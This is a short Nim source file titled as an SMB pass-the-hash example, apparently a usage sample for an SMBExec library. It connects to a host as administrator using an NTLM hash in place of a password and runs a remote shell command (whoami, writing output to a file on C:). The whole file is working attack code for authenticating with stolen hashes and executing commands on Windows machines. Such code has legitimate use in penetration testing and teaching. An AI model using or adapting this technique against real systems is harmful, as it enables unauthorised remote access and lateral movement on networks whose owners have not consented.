#[
    SMB Pass The Hash example
]#

#SMB1

import SMBExec

let hash = toNTLMHash("Aa123456") # 47bf8039a8506cd67c524a03ff84ba4e
var smb = newSMB2("ip", ".", "administrator", "f8011acf167c3261d807ca5a5301a94e")
let response = smb.connect()

smb.exec("%COMSPEC% /C \"whoami && start whoami > c:\\whoami.txt\"", response)

smb.close()
echo "SMB closed properly" 